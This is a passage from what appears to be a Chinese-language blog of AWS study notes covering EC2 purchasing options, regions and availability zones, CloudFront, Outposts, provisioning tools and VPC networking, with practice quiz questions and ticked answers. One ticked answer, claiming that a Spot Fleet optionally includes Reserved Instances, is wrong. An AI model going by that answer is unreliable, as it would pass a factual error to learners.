</ul>
</li>
<li>定義了願意為現貨實例支付的最高價格<ul>
<li>如果現貨價格超過了，就會失去該實例</li>
</ul>
</li>
<li>非常便宜</li>
<li>但隨時會丟失Instances</li>
</ul>
<p>Dedicated Hosts 專用主機</p>
<ul>
<li>預定整個物理服務器並控制Instances 位置</li>
<li>可以訪問物理服務器本身</li>
<li>具有完全專用於你的用例的EC2實例容量實際物理服務器</li>
<li>如果你希望在以下情況中、或有合規性要求、需要使用現有服務器綁定軟體許可證(基於每插槽、每內核、每虛擬機軟體許可證進行計費)</li>
<li>訪問物理服務器並獲得專用主機</li>
<li>按需購買</li>
<li>按秒付費</li>
<li>預定一年或三年</li>
<li>AWS中最昂貴選項</li>
<li>實際需要預留一台物理服務器</li>
<li>使用案例是指你的軟體採用自帶許可證的許可模式</li>
<li>公司有很強的法規或合規性需求</li>
</ul>
<p><img src="/img/aws_purch1.png" alt="Untitled"></p>
<p>Dedicated Instances 專用實例</p>
<ul>
<li>意味沒有其他客戶會共享你的硬體</li>
<li>有些實例運行在專用於你的硬體上</li>
<li>可以與同一帳戶中的其他實例共享硬體</li>
<li>無法控制實例位置</li>
<li>意味著你在自己的硬體上有自己的實例</li>
</ul>
<p>Capacity Reservations 預留容量</p>
<ul>
<li>特定AZ中為任何持續時間預留容量</li>
</ul>
<blockquote>
<p>AWS AZ是一個區域(Region)中的一或多個資料中心。每個資料中心都有獨立的電源、網路等硬體設備，彼此以高速網路連接並加密傳輸資料，藉此達到冗余及提高可用性。</p>
</blockquote>
<ul>
<li>任意持續時間內保留特定AZ中的按需實例</li>
<li>需要時隨時訪問該容量</li>
<li>沒有時間承諾，可隨時保留容量或取消保留</li>
<li>沒有帳單折扣</li>
<li>唯一目的是保留容量</li>
<li>想獲得計費折扣，需要將其與區域保留實例或儲蓄計劃相結合</li>
<li>按需收費，按預留容量付費</li>
<li>不啟動他們仍然需要付費</li>
<li>非常需要在特定AZ中運行的短期不間斷工作負載</li>
</ul>
<p><img src="/img/aws_purch2.png" alt="Untitled"></p>
<p>哪種方案適合你? 以度假村為例</p>
<ul>
<li>On demand: coming and staying in resort whenever we like, we pay the full price</li>
<li>Reserved: like planning ahead and if we plan to stay for a long time, we may get a good discount.</li>
<li>Savings Plans: pay a certain amount per hour for certain period and stay in any room type (e.g.,<br>King, Suite, Sea View,…)</li>
<li>Spot instances: the hotel allows people to bid for the empty rooms and the highest bidder keeps the rooms. You can get kicked out at any time</li>
<li>Dedicated Hosts: We book an entire building of the resort</li>
<li>Capacity Reservations: you book a room for a period with full price even you don’t stay in it</li>
</ul>
<p><strong>Which EC2 Purchasing Option can provide you the biggest discount, but it is not suitable for critical jobs or databases?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<blockquote>
<p>Spot Instances are good for short workloads and this is the cheapest EC2 Purchasing Option. But, they are less reliable because you can lose your EC2 instance.</p>
</blockquote>
<p><strong>What should you use to control traffic in and out of EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Network Access Control List (NACL)</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Security Groups</strong></li>
<li><input disabled="" type="checkbox"> • <strong>IAM Policies</strong></li>
</ul>
<p><strong>How long can you reserve an EC2 Reserved Instance?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>1 or 3 years</strong></li>
<li><input disabled="" type="checkbox"> • <strong>2 or 4 years</strong></li>
<li><input disabled="" type="checkbox"> • <strong>6 months or 1 year</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Anytime between 1 and 3 years</strong></li>
</ul>
<p><strong>You would like to deploy a High-Performance Computing (HPC) application on EC2 instances. Which EC2 instance type should you choose?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
</ul>
<blockquote>
<p>Compute Optimized EC2 instances are great for compute-intensive workloads requiring high-performance processors (e.g., batch processing, media transcoding, high-performance computing, scientific modeling &amp; machine learning, and dedicated gaming servers).</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Which EC2 Purchasing Option should you use for an application you plan to run on a server continuously for 1 year?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<blockquote>
<p>Reserved Instances are good for long workloads. You can reserve EC2 instances for 1 or 3 years.</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
</ul>
<p><strong>You are preparing to launch an application that will be hosted on a set of EC2 instances. This application needs some software installation and some OS packages need to be updated during the first launch. What is the best way to achieve this when you launch the EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Connect to each EC2 instance using SSH, then install the required software and update your OS packages manually</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then contact AWS Support and provide them with the script. They will run it on your EC2 instances at launch</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then use this script in EC2 User Data when you launch your EC2 instances</strong></li>
</ul>
<p><strong>Which EC2 Instance Type should you choose for a critical application that uses an in-memory database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>You have an e-commerce application with an OLTP database hosted on-premises. This application has popularity which results in its database has thousands of requests per second. You want to migrate the database to an EC2 instance. Which EC2 Instance Type should you choose to handle this high-frequency OLTP database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Security Groups can be attached to only one EC2 instance.</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
</ul>
<p><strong>You’re planning to migrate on-premises applications to AWS. Your company has strict compliance requirements that require your applications to run on dedicated servers. You also need to use your own server-bound software license to reduce costs. Which EC2 Purchasing Option is suitable for you?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<p><strong>You would like to deploy a database technology on an EC2 instance and the vendor license bills you based on the physical cores and underlying network socket visibility. Which EC2 Purchasing Option allows you to get visibility into them?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<p><strong>Spot Fleet is a set of Spot Instances and optionally ……………</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Instances</strong></li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS34" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS34/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.074Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS34/">
        AWS infrastructure 2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="單元-3-簡介"><a href="#單元-3-簡介" class="headerlink" title="單元 3 簡介"></a><strong>單元 3 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">高可用性概念</span><br><span class="line">└─ 提供可靠服務的能力，即使面臨突發事件或故障</span><br><span class="line"></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 資源分佈</span><br><span class="line">│    ├─ 遍布全球各地的 AWS 區域</span><br><span class="line">│    │    ├─ 提供高可用性和容錯能力</span><br><span class="line">│    │    └─ 客戶可以在不同區域使用 AWS 服務</span><br><span class="line">│    └─ 每個區域有多個可用區域</span><br><span class="line">│         └─ 提供在單一區域中提高可用性和容錯能力的選項</span><br><span class="line">└─ 用咖啡店比喻</span><br><span class="line"><span class="code">     ├─ 分店分佈</span></span><br><span class="line"><span class="code">     │    ├─ 在不同地點開設的咖啡店</span></span><br><span class="line"><span class="code">     │    └─ 客戶可前往其他分店繼續享用服務</span></span><br><span class="line"><span class="code">     └─ 遇到突發事件</span></span><br><span class="line"><span class="code">          ├─ 如遊行、水災或停電</span></span><br><span class="line"><span class="code">          └─ 客戶仍能在其他分店繼續享用服務</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="AWS-全球基礎設施"><a href="#AWS-全球基礎設施" class="headerlink" title="AWS 全球基礎設施"></a><strong>AWS 全球基礎設施</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">基本業務需求</span><br><span class="line">└─ 應用程式執行、內容存儲、資料分析等需求</span><br><span class="line"></span><br><span class="line">資料中心的挑戰</span><br><span class="line">└─ 天災或故障導致與資料中心失去連線</span><br><span class="line"><span class="code">    └─ 自經營資料中心至資料備份等解決方式，但存在成本與風險</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 區域建立</span><br><span class="line">│   ├─ 全球各地 AWS 區域</span><br><span class="line">│   │   └─ 包含多個可用區域</span><br><span class="line">│   │       └─ 擁有完整運算、儲存和服務設施</span><br><span class="line">│   └─ 區域間連線</span><br><span class="line">│        └─ 透過高速光纖網路連線</span><br><span class="line">│             └─ 提供全球營運支援</span><br><span class="line">└─ 區域資料主權</span><br><span class="line"><span class="code">     ├─ 資料受當地法律和國家法令約束</span></span><br><span class="line"><span class="code">     └─ 資料不會跨區域轉移</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">選取區域</span><br><span class="line">├─ 符合資料管控和法規要求</span><br><span class="line">│    └─ 根據公司及位置需求，在特定區域執行資料，如倫敦地區</span><br><span class="line">├─ 接近您的客戶,考慮與客戶群距離</span><br><span class="line">│    └─ 選取靠近客戶地區，加速內容傳遞，如維吉尼亞北部地區和新加坡</span><br><span class="line">├─ 區域內的可用服務,功能可用性</span><br><span class="line">│    └─ 考慮區域內提供的服務和功能，如Amazon Braket 在特定區域的可用性</span><br><span class="line">└─ 定價</span><br><span class="line"><span class="code">     └─ 考慮區域的價格成本，如聖保羅地區相比奧勒岡州的成本增加50%</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a><strong>節點</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施好處</span><br><span class="line">├─ 能提供更好的客戶服務</span><br><span class="line">├─ 可在全球各地建立衛星分店來服務客戶</span><br><span class="line">├─ 可在當地放置資料複本或快取，提高存取效率</span><br><span class="line">│   └─ 使用 CDN 概念，如 AWS CloudFront</span><br><span class="line">└─ 提供 AWS Outposts 解決方案，可在自己的大樓內使用 AWS 服務</span><br><span class="line"></span><br><span class="line">CDN Amazon CloudFront</span><br><span class="line">├─ 用於提供全球客戶資料、影片、應用程式和 API 的服務</span><br><span class="line">├─ 具有低延遲和高傳輸速度特性</span><br><span class="line">└─ 使用節點技術，在全球協助加速與使用者的通訊</span><br><span class="line"></span><br><span class="line">AWS 節點功能</span><br><span class="line">├─ 執行 CloudFront</span><br><span class="line">├─ 執行 DNS，如 Amazon Route 53</span><br><span class="line">└─ 可在全球範圍內加快通訊和內容交付</span><br><span class="line"></span><br><span class="line">AWS Outposts</span><br><span class="line">└─ 安裝一個完整運作的迷你區域在您的資料中心內，由 AWS 操作</span><br><span class="line"><span class="code">    └─ 提供 AWS 全功能，但設備獨立在您的大樓內</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34.png" alt="Untitled"></p>
<ol>
<li>來源: 假設公司的資料存放在巴西，而您有住在中國的客戶。若要提供內容給這些客戶，您並不需要將所有內容都移至某個中國區域。</li>
<li>節點: 您可以在靠近中國客戶的節點對本機的副本進行快取，不需要讓客戶從巴西取得資料。 </li>
<li>客戶: 如果中國的客戶請求您的某個檔案，Amazon CloudFront 會從節點的快取中擷取檔案，然後將檔案傳送給客戶。由於檔案來自中國附近的節點，而非巴西的原始來源，因此檔案交付給客戶的速度更快。</li>
</ol>
<h2 id="如何佈建-AWS-資源"><a href="#如何佈建-AWS-資源" class="headerlink" title="如何佈建 AWS 資源"></a><strong>如何佈建 AWS 資源</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 服務互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">└─ 軟體開發套件 (SDK)</span><br><span class="line"><span class="code">    ├─ 透過專為程式設計語言或平台設計的 API</span></span><br><span class="line"><span class="code">    ├─ 可讓您更輕鬆地使用 AWS 服務</span></span><br><span class="line"><span class="code">    └─ 支援的程式設計語言包括 C++、Java、.NET 等</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_1.png" alt="Untitled"></p>
<p><img src="/img/AWS34_2.png" alt="Untitled"></p>
<p><img src="/img/AWS34_3.png" alt="Untitled"></p>
<p><img src="/img/AWS34_4.png" alt="Untitled"></p>
<p><img src="/img/AWS34_5.png" alt="Untitled"></p>
<p><img src="/img/AWS34_6.png" alt="Untitled"></p>
<p>手動操作容易可能忘記勾選選項或是遺漏設定</p>
<p>使用可讓你撰寫或程式設計的API呼叫工具 - AWS CLI</p>
<ul>
<li>撰寫指令啟動EC2 - 指令可重複輸入，減少出錯率</li>
<li>程式以排程的方式執行</li>
<li>自動化部屬應用</li>
</ul>
<p><img src="/img/AWS34_7.png" alt="Untitled"></p>
<p><img src="/img/AWS34_8.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">├─ 軟體開發套件 (SDK)</span><br><span class="line">│   ├─ 透過專為程式設計語言或平台設計的 API</span><br><span class="line">│   ├─ 可讓您更輕鬆地使用 AWS 服務</span><br><span class="line">│   └─ 支援的程式設計語言包括 C++、Java、.NET 等</span><br><span class="line"></span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">│   ├─ 負責佈建環境所需的資源</span><br><span class="line">│   │   ├─ 調整容量</span><br><span class="line">│   │   ├─ 負載平衡</span><br><span class="line">│   │   ├─ 自動擴展</span><br><span class="line">│   │   └─ 應用程式運作狀態監控</span><br><span class="line"></span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    ├─ Infrastructure as Code 工具</span></span><br><span class="line"><span class="code">    ├─ 使用 JSON 或 YAML 文件定義 AWS 資源</span></span><br><span class="line"><span class="code">    ├─ 可重複部署且自動化建立基礎設施</span></span><br><span class="line"><span class="code">    └─ 在堆疊管理中提供自動復原變更的功能</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_9.png" alt="Untitled"></p>
<p><img src="/img/AWS34_10.png" alt="Untitled"></p>
<p><img src="/img/AWS34_11.png" alt="Untitled"></p>
<p><img src="/img/AWS34_12.png" alt="Untitled"></p>
<h2 id="單元-3-總結"><a href="#單元-3-總結" class="headerlink" title="單元 3 總結"></a><strong>單元 3 總結</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 可用區域形成區域，遍及全球</span><br><span class="line">│   ├─ 選擇在哪個區域和可用區域運作</span><br><span class="line">│   └─ 建議至少在兩個可用區域部署基礎設施</span><br><span class="line">│   </span><br><span class="line">├─ 自動部署多個可用區域的服務</span><br><span class="line">│   ├─ Elastic Load Balancing</span><br><span class="line">│   ├─ Amazon SQS</span><br><span class="line">│   └─ Amazon SNS</span><br><span class="line">│   </span><br><span class="line">├─ 節點部署內容以加速提供給客戶的速度</span><br><span class="line">│   </span><br><span class="line">└─ AWS Outposts</span><br><span class="line"><span class="code">    └─ 邊緣裝置，讓您在自己的資料中心運作 AWS 基礎設施</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 資源佈建工具</span><br><span class="line">├─ AWS Management Console</span><br><span class="line">├─ 開發套件 SDK</span><br><span class="line">├─ CLI</span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    └─ 將基礎設施設定為程式碼</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h3 id="單元-3-測驗"><a href="#單元-3-測驗" class="headerlink" title="單元 3 測驗"></a><strong>單元 3 測驗</strong></h3><p>關於 AWS 全球基礎設施，以下哪個敘述正確？</p>
<ul>
<li><input disabled="" type="checkbox"> 區域只含單一可用區域。</li>
<li><input disabled="" type="checkbox"> 可用區域由兩個或多個區域組成。</li>
<li><input checked="" disabled="" type="checkbox"> 區域由三個或多個可用區域組成。</li>
</ul>
<blockquote>
<p>正確的回答選項是<strong>區域由三個或多個可用區域組成</strong>。</p>
<p>例如，南美洲（聖保羅）區域是 sa-east-1。它包含三個可用區域：sa-east-1<strong>a</strong>、sa-east-1<strong>b</strong> 以及 sa-east-1<strong>c</strong>。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 可用區域只含單一區域。</li>
</ul>
<p>選擇區域時應考慮哪些因素？(請選取兩個。)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 符合資料管控和法規要求</li>
<li><input checked="" disabled="" type="checkbox"> 接近您的客戶</li>
<li><input disabled="" type="checkbox"> 全天候皆可取得技術支援</li>
<li><input disabled="" type="checkbox"> 可向不同使用者指派自訂權限的功能</li>
<li><input disabled="" type="checkbox"> 存取 AWS 命令列界面 (AWS CLI)</li>
</ul>
<blockquote>
<p>另外兩個在選取區域時要考慮的因素是定價和區域中的可用服務。</p>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>您選擇的支援層級並不是由區域決定。</li>
<li>向不同使用者指派自訂權限是在所有 AWS 區域都可以使用的功能。</li>
<li>AWS 命令列界面 (AWS CLI) 適用於所有 AWS 區域。</li>
</ul>
</blockquote>
<p>以下哪個敘述與 Amazon CloudFront 最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 一種可讓您以混合雲端方法執行基礎設施的服務</li>
<li><input disabled="" type="checkbox"> 一種容器專用的無伺服器運算引擎</li>
<li><input disabled="" type="checkbox"> 一種可讓您透過佇列在軟體元件之間傳送和接收訊息的服務</li>
<li><input checked="" disabled="" type="checkbox"> 全球內容交付服務</li>
</ul>
<blockquote>
<p>正確的回答選項是<strong>全球內容交付服務</strong>。</p>
<p>Amazon CloudFront 是一種內容交付服務。這項服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。內容經過快取後，會以副本形式存放在本機。這些內容可能是影片檔案、相片、網頁等。</p>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>AWS Outposts 這項服務可讓您以混合雲端方法執行基礎設施。</li>
<li>AWS Fargate 是一種容器專用的無伺服器運算引擎。</li>
<li>Amazon Simple Queue Service (Amazon SQS) 這項服務可讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
</ul>
</blockquote>
<p>Amazon CloudFront 使用以下哪個站點來快取內容副本，藉此在任何位置都能快速交付給使用者？</p>
<ul>
<li><input disabled="" type="checkbox"> 區域</li>
<li><input disabled="" type="checkbox"> 可用區域</li>
<li><input checked="" disabled="" type="checkbox"> 節點</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>區域是指一個獨立的地理位置，其中的多個位置是彼此分隔的。</li>
<li>可用區域在 AWS 全球基礎設施中是完全分隔的。</li>
<li>來源是指 CloudFront 取得檔案的伺服器。CloudFront 原始伺服器的範例包括 Amazon Simple Storage Service (Amazon S3) 儲存貯體和 Web 伺服器。</li>
</ul>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 來源</li>
</ul>
<p>您可以使用 AWS Outposts 執行以下哪個動作？</p>
<ul>
<li><input disabled="" type="checkbox"> 透過指令碼自動化 AWS 服務和應用程式動作。</li>
<li><input disabled="" type="checkbox"> 存取精靈和自動化工作流程，以便在 AWS 服務中執行任務。</li>
<li><input disabled="" type="checkbox"> 以支援的程式設計語言開發 AWS 應用程式。</li>
<li><input checked="" disabled="" type="checkbox"> 將 AWS 基礎設施和服務延伸到不同位置，包括您的內部部署資料中心。</li>
</ul>
<blockquote>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>AWS 命令列界面 (AWS CLI) 是用於透過指令碼來自動化 AWS 服務和應用程式動作。</li>
<li>AWS 管理主控台包含可用來在 AWS 服務中完成任務的精靈和工作流程。</li>
<li>軟體開發套件 (SDK) 可讓您以支援的程式設計語言開發 AWS 應用程式。</li>
</ul>
</blockquote>
<h1 id="單元-4-簡介"><a href="#單元-4-簡介" class="headerlink" title="單元 4 簡介"></a><strong>單元 4 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 允許在自定義的虛擬網路中啟動 AWS 資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 公有和私有的資源群組稱為子網路，有各自的 IP 地址範圍</span><br><span class="line"></span><br><span class="line">拿咖啡店舉例</span><br><span class="line">├─ 收銀員</span><br><span class="line">│   └─ 負責點餐，分配到公有子網路，與客人互動</span><br><span class="line">│   </span><br><span class="line">└─ 咖啡師</span><br><span class="line"><span class="code">    └─ 專心製作咖啡，分配到私有子網路，避免直接與客人互動</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="AWS-的連線能力"><a href="#AWS-的連線能力" class="headerlink" title="AWS 的連線能力"></a><strong>AWS 的連線能力</strong></h2><p><img src="/img/AWS34_13.png" alt="Untitled"></p>
<p><img src="/img/AWS34_14.png" alt="Untitled"></p>
<p><img src="/img/AWS34_15.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (Amazon VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 子網路是 VPC 的一個區段，當中可包含 Amazon EC2 執行個體等資源</span><br><span class="line"></span><br><span class="line">網際網路閘道</span><br><span class="line">└─ 網際網路閘道是 VPC 和網際網路之間的連結</span><br><span class="line">   ├─ 類似於咖啡店的前門，允許公有流量存取 VPC</span><br><span class="line">   └─ 沒有網際網路閘道，任何人都無法存取 VPC 內的資源</span><br><span class="line"></span><br><span class="line">虛擬私有閘道</span><br><span class="line">└─ 虛擬私有閘道是允許受保護的網際網路流量進入 VPC 的元件</span><br><span class="line">   ├─ 類似於在道路上有保全保護，只允許特定的人通行</span><br><span class="line">   ├─ 在 VPC 和內部企業網路之間建立 VPN 連線</span><br><span class="line">   └─ 允許存取 VPC 中的私有資源</span><br><span class="line"></span><br><span class="line">AWS Direct Connect</span><br><span class="line">├─ 建立專用私有連線，連接資料中心和 VPC</span><br><span class="line">├─ 提供專用的私有連線，不受其他用戶影響</span><br><span class="line">└─ 如同在公寓大樓中有專用走廊通往咖啡店，只有住戶能使用的專屬通道</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_16.png" alt="連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。"></p>
<p>連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。</p>
<p><img src="/img/AWS34_17.png" alt="虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。"></p>
<p>虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。</p>
<p><img src="/img/AWS34_18.png" alt="Untitled"></p>
<p>企業資料中心會將網路流量路由至 AWS Direct Connect 位置。然後，該流量會透過虛擬私有閘道路由至 VPC。企業資料中心與 VPC 之間的所有網路流量都會透過此專用私有連線流量流程。</p>
<h2 id="子網路和網路存取權限控制清單-ACL"><a href="#子網路和網路存取權限控制清單-ACL" class="headerlink" title="子網路和網路存取權限控制清單 (ACL)"></a><strong>子網路和網路存取權限控制清單 (ACL)</strong></h2><ul>
<li>VPC 網路強化<ul>
<li>安全性工具和技術<ul>
<li>網路層面安全<ul>
<li>子網路<ul>
<li>公有子網路<ul>
<li>可存取網際網路閘道</li>
</ul>
</li>
<li>私有子網路<ul>
<li>無法存取網際網路閘道</li>
</ul>
</li>
<li>控制流量權限<ul>
<li>網路 ACL (無狀態)<ul>
<li>海關審查人員的比喻</li>
<li>檢查封包進出子網路<ul>
<li>核准名單檢查<ul>
<li>流量可進出 VPC</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>安全群組 (具狀態)<ul>
<li>每個 EC2 執行個體自動加入</li>
<li>預設拒絕所有流量</li>
<li>可修改以允許特定類型的流量</li>
<li>檢查封包進出 EC2 執行個體<ul>
<li>核准名單檢查<ul>
<li>封包通過時不需再次檢查</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>封包的流動過程<ul>
<li>封包從源執行個體至目標執行個體<ul>
<li>安全群組檢查<ul>
<li>允許所有傳出流量</li>
</ul>
</li>
<li>網路 ACL 檢查<ul>
<li>核准名單檢查<ul>
<li>封包通過</li>
</ul>
</li>
</ul>
</li>
<li>安全群組再次檢查</li>
</ul>
</li>
<li>封包回傳流程<ul>
<li>安全群組允許傳回流量<ul>
<li>允許所有傳回流量</li>
</ul>
</li>
<li>網路 ACL 檢查<ul>
<li>核准名單檢查<ul>
<li>封包通過</li>
</ul>
</li>
</ul>
</li>
<li>安全群組再次檢查</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>整體效果<ul>
<li>深度安全性<ul>
<li>結合網路 ACL 和安全群組</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
